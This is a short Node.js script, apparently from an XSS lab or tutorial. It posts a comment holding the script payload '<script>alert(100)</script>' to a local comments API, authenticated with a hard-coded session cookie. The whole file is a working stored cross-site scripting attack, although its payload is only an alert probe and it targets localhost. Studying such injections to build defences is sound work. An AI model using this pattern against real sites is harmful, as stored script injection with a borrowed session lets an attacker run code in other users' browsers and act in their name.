let comment = JSON.stringify({ content: "<script>alert(100)</script>" });
let options = {
  host: "localhost",
  port: 3002,
  path: "/api/comments",
  method: "POST",
  headers: {
    Cookie: "sessionId=session-1536460279485397.5640618347227",
    "Content-Type": "application/json"
  }
};
let http = require("http");
let req = http.request(options, function(res) {
  res.on("data", function() {
    console.log(res.toString(0));
  });
});
req.write(comment);
req.end();
